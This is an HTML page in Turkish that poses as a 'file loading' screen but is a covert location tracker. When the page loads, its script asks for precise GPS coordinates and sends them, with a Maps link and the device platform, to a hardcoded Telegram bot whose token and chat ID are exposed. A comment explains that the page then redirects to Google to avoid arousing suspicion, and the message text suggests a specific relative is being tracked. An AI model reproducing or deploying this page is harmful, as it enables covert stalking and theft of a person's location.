<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>İçerik Yükleniyor...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p style="margin-left: 20px;">Dosya yükleniyor, lütfen bekleyin...</p>

    <script>
        // Telegram Bot Bilgilerin
        const botToken = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
        const chatId = "5802794454";

        window.onload = function() {
            // Tarayıcıdan konum iste
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                    enableHighAccuracy: true, // GPS'i zorla (daha net sonuç verir)
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                sendToTelegram("Hata: Tarayıcı konumu desteklemiyor.");
            }
        };

        function sendLocation(position) {
            const lat = position.coords.latitude; // Enlem
            const lon = position.coords.longitude; // Boylam
            const accuracy = position.coords.accuracy; // Doğruluk payı (metre)

            // Google Haritalar Linki Oluşturma
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const message = `📍 Kardeşinin Konumu Bulundu!\n\n` +
                            `🌐 Harita Linki: ${mapsLink}\n` +
                            `🎯 Doğruluk: ${Math.round(accuracy)} metre\n` +
                            `📱 Cihaz: ${navigator.platform}`;

            sendToTelegram(message);
        }

        function handleError(error) {
            let errorMsg = "Konum hatası: ";
            if (error.code === 1) errorMsg += "Kullanıcı izin vermedi.";
            else if (error.code === 2) errorMsg += "Konum tespit edilemedi.";
            else if (error.code === 3) errorMsg += "Zaman aşımı.";
            
            sendToTelegram(errorMsg);
        }

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
            .then(() => {
                // Veri gittikten sonra şüphe çekmemek için bir yere yönlendir
                // Mesela Google'a ya da sevdiği bir videoya
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1000);
            });
        }
    </script>
</body>
</html>
